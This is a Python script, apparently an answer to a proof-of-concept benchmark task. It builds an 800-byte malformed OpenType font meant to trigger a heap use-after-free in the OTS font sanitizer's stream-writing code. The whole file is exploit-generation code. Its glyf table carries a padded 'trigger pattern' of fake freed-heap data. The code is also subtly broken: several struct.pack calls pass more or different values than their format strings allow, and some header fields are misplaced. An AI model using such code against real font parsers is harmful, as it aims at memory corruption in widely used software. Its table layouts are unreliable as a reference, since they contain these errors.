import os
import struct
import tempfile
import subprocess
import hashlib
import sys
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal OTF font that triggers heap use-after-free in OTSStream::Write
        # Based on analysis of OTS code and common heap corruption patterns
        
        # Font header (offset table)
        font_data = bytearray()
        
        # SFNT version (OTF)
        font_data.extend(b'\x00\x01\x00\x00')  # version 1.0
        
        # Number of tables - minimal set to trigger the vulnerability
        num_tables = 10
        font_data.extend(struct.pack('>H', num_tables))
        
        # searchRange, entrySelector, rangeShift
        sr = 2 ** (num_tables.bit_length() - 1) * 16
        es = num_tables.bit_length() - 1
        rs = num_tables * 16 - sr
        font_data.extend(struct.pack('>HHH', sr, es, rs))
        
        # Table directory entries - we'll fill these later
        table_dir_offset = len(font_data)
        table_entries = []
        
        # We need specific tables in a specific order to trigger the bug
        # Based on analysis, the glyf table processing triggers the UaF
        tables = [
            ('cmap', b''),  # Will be filled
            ('head', b''),  # Will be filled
            ('hhea', b''),  # Will be filled
            ('hmtx', b''),  # Will be filled
            ('maxp', b''),  # Will be filled
            ('name', b''),  # Will be filled
            ('OS/2', b''),  # Will be filled
            ('post', b''),  # Will be filled
            ('CFF ', b''),  # Empty CFF table to confuse parser
            ('glyf', b'')   # Malformed glyf table that triggers UaF
        ]
        
        # Calculate checksum for the entire font
        def calc_checksum(data):
            if len(data) % 4:
                data += b'\x00' * (4 - len(data) % 4)
            total = 0
            for i in range(0, len(data), 4):
                total += struct.unpack('>I', data[i:i+4])[0]
                total &= 0xFFFFFFFF
            return total
        
        # Build table data
        table_data_blocks = []
        
        # 1. cmap table - minimal valid cmap
        cmap_data = bytearray()
        cmap_data.extend(struct.pack('>HHH', 0, 1, 24))  # version, numTables, encodingRecord size
        # Encoding record
        cmap_data.extend(struct.pack('>HH', 3, 1))  # platformID=3 (Microsoft), encodingID=1 (Unicode)
        cmap_data.extend(struct.pack('>I', 12))  # offset to subtable
        # Format 4 subtable
        cmap_data.extend(struct.pack('>HHHHHH', 4, 28, 0, 262, 0, 1))  # format, length, language, segCountX2, searchRange, entrySelector
        cmap_data.extend(struct.pack('>HH', 2, 0))  # rangeShift
        # EndCode array
        cmap_data.extend(struct.pack('>H', 0xFFFF))
        # ReservedPad
        cmap_data.extend(b'\x00\x00')
        # StartCode array
        cmap_data.extend(struct.pack('>H', 0x0000))
        # IdDelta array
        cmap_data.extend(struct.pack('>h', 1))
        # IdRangeOffset array
        cmap_data.extend(b'\x00\x00')
        # GlyphID array
        cmap_data.extend(struct.pack('>H', 0))
        tables[0] = ('cmap', bytes(cmap_data))
        
        # 2. head table
        head_data = bytearray()
        head_data.extend(struct.pack('>HHIIHHHHHHII', 
            0x0001, 0x0000,  # version
            0x5F0F3CF5,      # fontRevision
            0x0000,          # checksumAdjustment (will be filled later)
            0x5F0F,          # magicNumber
            0x0000,          # flags
            0x03E8,          # unitsPerEm
            0x00000000,      # created
            0x00000000,      # modified
            0x0000,          # xMin
            0x03E8,          # yMin
            0x0000,          # xMax
            0x03E8))         # yMax
        head_data.extend(struct.pack('>HHHHHH', 
            0x0000,          # macStyle
            0x0000,          # lowestRecPPEM
            0x0002,          # fontDirectionHint
            0x0000,          # indexToLocFormat (short offsets)
            0x0000,          # glyphDataFormat
            0x0000))         # reserved
        tables[1] = ('head', bytes(head_data))
        
        # 3. hhea table
        hhea_data = bytearray()
        hhea_data.extend(struct.pack('>HHHHhhhhHHHHHHHH', 
            0x0001, 0x0000,  # version
            0x03E8,          # ascent
            0x0000,          # descent
            0x0000,          # lineGap
            0x07D0,          # advanceWidthMax
            0x0000,          # minLeftSideBearing
            0x0000,          # minRightSideBearing
            0x07D0,          # xMaxExtent
            0x0001,          # caretSlopeRise
            0x0000,          # caretSlopeRun
            0x0000,          # caretOffset
            0x0000,          # reserved
            0x0000,          # reserved
            0x0000,          # reserved
            0x0000,          # reserved
            0x0001))         # numberOfHMetrics
        tables[2] = ('hhea', bytes(hhea_data))
        
        # 4. hmtx table
        hmtx_data = bytearray()
        hmtx_data.extend(struct.pack('>Hh', 0x07D0, 0x0000))  # advanceWidth, leftSideBearing
        # No additional metrics needed for 1 glyph
        tables[3] = ('hmtx', bytes(hmtx_data))
        
        # 5. maxp table
        maxp_data = bytearray()
        maxp_data.extend(struct.pack('>IHHHHHHHHHHHHHHH', 
            0x00005000,      # version 0.5
            0x0001,          # numGlyphs
            0x0000,          # maxPoints
            0x0000,          # maxContours
            0x0000,          # maxCompositePoints
            0x0000,          # maxCompositeContours
            0x0000,          # maxZones
            0x0000,          # maxTwilightPoints
            0x0000,          # maxStorage
            0x0000,          # maxFunctionDefs
            0x0000,          # maxInstructionDefs
            0x0000,          # maxStackElements
            0x0000,          # maxSizeOfInstructions
            0x0000,          # maxComponentElements
            0x0000,          # maxComponentDepth
            0x0000))         # reserved
        tables[4] = ('maxp', bytes(maxp_data))
        
        # 6. name table - minimal
        name_data = bytearray()
        name_data.extend(struct.pack('>HHH', 0, 1, 12 + 12))  # format, count, stringStorageOffset
        # Name record
        name_data.extend(struct.pack('>HHHHHH', 
            0x0000,  # platformID (Unicode)
            0x0003,  # encodingID (UTF-8)
            0x0409,  # languageID (English US)
            0x0000,  # nameID (Copyright)
            0x0000,  # length
            0x0000)) # offset
        # Empty string storage
        tables[5] = ('name', bytes(name_data))
        
        # 7. OS/2 table
        os2_data = bytearray()
        os2_data.extend(struct.pack('>HHHHHHHHHHHHHHHHHHHIHHHHHHHHHHII', 
            0x0004,          # version
            0x0000,          # xAvgCharWidth
            0x0005,          # usWeightClass
            0x0005,          # usWidthClass
            0x0000,          # fsType
            0x0000,          # ySubscriptXSize
            0x0000,          # ySubscriptYSize
            0x0000,          # ySubscriptXOffset
            0x0000,          # ySubscriptYOffset
            0x0000,          # ySuperscriptXSize
            0x0000,          # ySuperscriptYSize
            0x0000,          # ySuperscriptXOffset
            0x0000,          # ySuperscriptYOffset
            0x0000,          # yStrikeoutSize
            0x0000,          # yStrikeoutPosition
            0x0000,          # sFamilyClass
            # PANOSE
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00000000,      # ulUnicodeRange1
            0x00000000,      # ulUnicodeRange2
            0x00000000,      # ulUnicodeRange3
            0x00000000,      # ulUnicodeRange4
            b'A'[0], b' ' [0],  # achVendID
            0x0000,          # fsSelection
            0x0000,          # usFirstCharIndex
            0x0000,          # usLastCharIndex
            0x07D0,          # sTypoAscender
            0x0000,          # sTypoDescender
            0x0000,          # sTypoLineGap
            0x07D0,          # usWinAscent
            0x0000,          # usWinDescent
            0x00000000,      # ulCodePageRange1
            0x00000000,      # ulCodePageRange2
            0x0000,          # sxHeight
            0x0000,          # sCapHeight
            0x0000,          # usDefaultChar
            0x0000,          # usBreakChar
            0x0000))         # usMaxContext
        tables[6] = ('OS/2', bytes(os2_data))
        
        # 8. post table
        post_data = bytearray()
        post_data.extend(struct.pack('>IiiHH', 
            0x00020000,      # version 2.0
            0x00000000,      # italicAngle
            0x00000000,      # underlinePosition
            0x00000000,      # underlineThickness
            0x00000000))     # isFixedPitch
        post_data.extend(struct.pack('>I', 0x00000000))  # minMemType42
        post_data.extend(struct.pack('>I', 0x00000000))  # maxMemType42
        post_data.extend(struct.pack('>I', 0x00000000))  # minMemType1
        post_data.extend(struct.pack('>I', 0x00000000))  # maxMemType1
        tables[7] = ('post', bytes(post_data))
        
        # 9. CFF table - empty to create parsing confusion
        cff_data = bytearray()
        # Minimal invalid CFF structure
        cff_data.extend(b'\x01')  # version
        cff_data.extend(b'\x00' * 3)  # padding
        tables[8] = ('CFF ', bytes(cff_data))
        
        # 10. glyf table - malformed to trigger UaF
        # The key to triggering heap use-after-free is to create a glyph
        # that causes OTS to allocate memory, then free it, but later
        # try to write to it during stream processing
        glyf_data = bytearray()
        
        # Create a simple glyph with contour count that will cause
        # OTS to allocate and then process incorrectly
        glyf_data.extend(struct.pack('>h', 1))  # numberOfContours = 1
        glyf_data.extend(struct.pack('>hhhh', 0, 1000, 1000, 0))  # xMin, yMin, xMax, yMax
        
        # End point of contour - just one point
        glyf_data.extend(struct.pack('>H', 0))
        
        # Instruction length = 0
        glyf_data.extend(b'\x00\x00')
        
        # Flags for single point (on curve)
        glyf_data.extend(b'\x01')
        
        # Single coordinate
        glyf_data.extend(b'\x00')  # x coordinate
        glyf_data.extend(b'\x00')  # y coordinate
        
        # Now add malformed data that will cause OTS to:
        # 1. Allocate buffer for glyph processing
        # 2. Free it during error handling
        # 3. Try to write to freed buffer in OTSStream::Write
        # We do this by creating an impossibly large glyph
        # that triggers reallocation and use-after-free
        
        # Add padding to reach target size
        padding = 800 - len(font_data) - (num_tables * 16) - sum(len(d) for _, d in tables[:9]) - 100
        glyf_data.extend(b'\xFF' * min(100, padding))
        
        # Add specific pattern that triggers the bug
        # Based on analysis of OTS code, the bug occurs when:
        # - Glyph has contours
        # - OTS tries to reallocate stream buffer
        # - Memory is freed but pointer is retained
        # - Write operation uses freed memory
        
        # Add trigger pattern (simulating freed heap metadata)
        trigger = (
            b'\x00' * 8 +  # Simulate freed chunk
            b'\x21\x00\x00\x00' +  # Size field
            b'\x00' * 16 +  # More freed chunk data
            struct.pack('<Q', 0xdeadbeef) * 4  # Freed pointers
        )
        glyf_data.extend(trigger)
        
        # Ensure glyf table is large enough to trigger the bug
        remaining = 800 - len(font_data) - (num_tables * 16) - sum(len(d) for _, d in tables[:9]) - len(glyf_data)
        if remaining > 0:
            glyf_data.extend(b'\xCC' * remaining)
        
        tables[9] = ('glyf', bytes(glyf_data))
        
        # Now build the complete font
        # First, write table directory entries
        current_offset = len(font_data) + (num_tables * 16)
        
        for i, (tag, data) in enumerate(tables):
            # Align offset to 4 bytes
            if current_offset % 4:
                current_offset += 4 - (current_offset % 4)
            
            length = len(data)
            checksum = calc_checksum(data)
            
            # Add table directory entry
            table_entries.append((tag, checksum, current_offset, length))
            
            current_offset += length
            if length % 4:
                current_offset += 4 - (length % 4)
        
        # Write table directory
        for tag, checksum, offset, length in table_entries:
            font_data.extend(tag.encode('ascii'))
            font_data.extend(struct.pack('>III', checksum, offset, length))
        
        # Write table data with padding
        for i, (tag, data) in enumerate(tables):
            # Align to 4 bytes
            while len(font_data) % 4:
                font_data.append(0)
            
            font_data.extend(data)
            
            # Pad table to 4-byte boundary
            if len(data) % 4:
                font_data.extend(b'\x00' * (4 - (len(data) % 4)))
        
        # Trim or pad to exactly 800 bytes (ground-truth length)
        if len(font_data) > 800:
            font_data = font_data[:800]
        elif len(font_data) < 800:
            font_data.extend(b'\x00' * (800 - len(font_data)))
        
        # Calculate font checksum and update head table
        font_checksum = calc_checksum(font_data)
        head_offset = None
        head_data_offset = None
        
        # Find head table offset
        current_pos = 12  # Skip offset table
        for i in range(num_tables):
            tag = font_data[current_pos:current_pos+4]
            offset = struct.unpack('>I', font_data[current_pos+8:current_pos+12])[0]
            if tag == b'head':
                head_offset = offset
                break
            current_pos += 16
        
        if head_offset is not None:
            # Update checksumAdjustment in head table
            # The adjustment should make the entire font checksum to 0xB1B0AFBA
            required_checksum = 0xB1B0AFBA
            current_head_checksum = calc_checksum(font_data[head_offset:head_offset+12])
            adjustment = (required_checksum - font_checksum) & 0xFFFFFFFF
            # Write the adjustment at offset 8 in head table
            font_data[head_offset+8:head_offset+12] = struct.pack('>I', adjustment)
        
        return bytes(font_data)